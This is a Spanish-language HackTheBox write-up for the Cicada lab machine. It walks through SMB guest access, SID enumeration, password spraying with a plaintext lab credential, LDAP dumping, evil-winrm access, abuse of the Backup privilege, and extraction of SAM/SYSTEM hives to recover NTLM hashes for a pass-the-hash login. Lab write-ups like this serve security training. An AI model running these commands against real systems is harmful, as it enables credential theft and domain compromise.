---
layout: single
title: Cicada - HackTheBox
excerpt: "Este writeup documenta la explotación de la máquina Cicada en HackTheBox, destacando vulnerabilidades y técnicas de escalada de privilegios mediante SMB, dumping de LDAP y abuso de permisos de Backup."
date: 2025-03-03
classes: wide
header:
  teaser: /assets/images/Cicada/Cicada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
tags:  
  - SMB Exploitation
  - Windows Privilege Escalation
  - LDAP Dumping
---

![](/assets/images/Cicada/Cicada.png){:style="max-width:450px;height:auto;"}

## Resumen

En este writeup se explora la explotación de la máquina Cicada en HackTheBox, abordando diversas vulnerabilidades que permiten la escalada de privilegios hasta el usuario Administrator. Se documenta el proceso completo, desde el reconocimiento inicial hasta la obtención de acceso y escalación de privilegios, utilizando técnicas como el acceso a recursos compartidos SMB, el dumping de LDAP y el abuso de permisos en Windows.

## Reconocimiento

El servidor expone los siguientes servicios:

- Domain en el puerto 53

- Kerberos-sec en el puerto 88

- MSRPC en el puerto 135

- Netbios-ssn en el puerto 139

- LDAP en el puerto 389

- Microsoft-ds en el puerto 445

- Kpasswd5 en el puerto 464

- SSL/LDAP en el puerto 636

- LDAP en el puerto 3268

- SSL/LDAP en el puerto 3269

- HTTP en el puerto 5985

Realizamos un escaneo de puertos con nmap para identificar los servicios disponibles, también ejecutamos scripts básicos de reconocimiento con nmap:

![](/assets/images/Cicada/Reconocimiento-Puertos.png)

![](/assets/images/Cicada/Reconocimiento-Puertos-Scripts.png)

## SMB Shares

Una vez hecho el reconocimiento, si vemos los recursos compartidos con el usuario 'Guest' sin agregar contraseña, podemos ver que tenemos dos recursos 'HR' y 'IPC$':

![](/assets/images/Cicada/SMB-Shares.png)

Si entramos en el recurso 'HR', nos encontramos con un fichero txt (Notice from HR.txt), nos lo traemos a nuestra máquina:

![](/assets/images/Cicada/SMB-Shares-HR.png)

Si observamos el documento, podemos encontrarnos con una credencial:

![](/assets/images/Cicada/SMB-Shares-HR-File.png)

Si listamos los usuarios que hay en el dominio:

    -> impacket-lookupsid anonymous@cicada.htb
        Impacket v0.11.0 - Copyright 2023 Fortra

        Password:
        [*] Brute forcing SIDs at cicada.htb
        [*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
        [*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
        500: CICADA\Administrator (SidTypeUser)
        501: CICADA\Guest (SidTypeUser)
        502: CICADA\krbtgt (SidTypeUser)
        512: CICADA\Domain Admins (SidTypeGroup)
        513: CICADA\Domain Users (SidTypeGroup)
        514: CICADA\Domain Guests (SidTypeGroup)
        515: CICADA\Domain Computers (SidTypeGroup)
        516: CICADA\Domain Controllers (SidTypeGroup)
        517: CICADA\Cert Publishers (SidTypeAlias)
        518: CICADA\Schema Admins (SidTypeGroup)
        519: CICADA\Enterprise Admins (SidTypeGroup)
        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
        525: CICADA\Protected Users (SidTypeGroup)
        526: CICADA\Key Admins (SidTypeGroup)
        527: CICADA\Enterprise Key Admins (SidTypeGroup)
        553: CICADA\RAS and IAS Servers (SidTypeAlias)
        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
        1000: CICADA\CICADA-DC$ (SidTypeUser)
        1101: CICADA\DnsAdmins (SidTypeAlias)
        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
        1103: CICADA\Groups (SidTypeGroup)
        1104: CICADA\john.smoulder (SidTypeUser)
        1105: CICADA\sarah.dantelia (SidTypeUser)
        1106: CICADA\michael.wrightson (SidTypeUser)
        1108: CICADA\david.orelious (SidTypeUser)
        1109: CICADA\Dev Support (SidTypeGroup)
        1601: CICADA\emily.oscars (SidTypeUser)

Podemos hacer un 'passsword spraying' y con eso averiguar el usuario de esa credencial anteriormente encontrada.

    nxc smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success

Una vez sabemos que el usuario 'Michael.wrightson' tiene la credencial anteriormente encontrada, podemos dumpear LDAP.

Una vez dumpeada, hay un archivo llamado 'domain.users.grep' que contiene un usuario 'david.orelious' con su contraseña:

![](/assets/images/Cicada/LDAP-DUMP.png)

Con las credenciales de 'david.orelious', vamos a ver que recursos compartidos puede ver:

![](/assets/images/Cicada/SMB-Shares-David.png)

Vemos que tiene permisos de lectura en 'DEV', 'HR', 'IPC$', 'NETLOGIN' y en 'SYSVOL', la que nos interesa es 'DEV', hay un archivo llamado 'Backup_script.ps1':

![](/assets/images/Cicada/SMB-Shares-David-DEV.png)

Si nos lo traemos a nuestra máquina, podemos ver otras credenciales, en este caso de la usuaria 'emily.oscars' y su contraseña:

![](/assets/images/Cicada/SMB-Shares-David-DEV-File.png)

## Reverse Shell

Con la herramienta 'evil-winrm' nos conectamos como la usuaria 'emily.oscars', y en su escritorio tenemos la bandera 'user':

![](/assets/images/Cicada/Reverse-Shell.png)

## Escalada de Privilegios

Si listamos los permisos que tiene emily:

![](/assets/images/Cicada/Emily-Privileges.png)

Podemos ver que tenemos permisos de 'Backup', podemos hacer una copia de la bandera 'root':

![](/assets/images/Cicada/Robocopy.png)

![](/assets/images/Cicada/Flag-Root.png)

### NOTA

En vez de copiar solo la bandera y dar por finalizada la máquina, también se puede escalar de privilegios extrayendo los archivos 'SAM' y 'SYSTEM':

- SAM: Contiene los hashes de las contraseñas de los usuarios locales

- SYSTEM: Contiene la clave de cifrado necesaria para descifrar los hashes de SAM

Se extraen:

    reg save hklm\sam c:\Directorio-a-elegir\sam (nombre final para el archivo)

    reg save hklm\system c:\Directorio-a-elegir\system (nombre final para el archivo)

Traes a tu equipo los archivos, y con la herramienta 'pypykatz' analizas los archivos SAM y SYSTEM para obtener los hashes NTLM:

    -> pypykatz registry --sam sam system
        WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
        WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
        ============== SYSTEM hive secrets ==============
        CurrentControlSet: ControlSet001
        Boot Key: 3c2b033757a49110a9ee680b46e8d620
        ============== SAM hive secrets ==============
        HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c1010101010101010101010101
        Administrator:500:aad3b435b51404eeaad3b435b5:2b87e7c93a3e8a0*********:::
        Guest:501:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b73c5***********:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b5:31d6cfe0d16ae931b7*****:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b:31d6cfe0d16ae931b73c59*****:::

Una vez tienes el hash NTLM del usuario 'Administrator', inicias una shell con la herramienta 'evil-winrm':

    evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a********

### Conclusión

La máquina Cicada demuestra cómo múltiples vectores de ataque pueden ser encadenados para comprometer un sistema. Desde la obtención de credenciales en recursos compartidos SMB hasta el dumping de LDAP y la escalada de privilegios mediante el abuso de permisos de Backup, este reto refuerza la importancia de la seguridad en entornos Windows. La combinación de técnicas como password spraying, LDAP dumping, abuso de permisos y extracción de hashes NTLM subraya la necesidad de aplicar buenas prácticas de seguridad, control de accesos y segmentación en cualquier infraestructura empresarial.
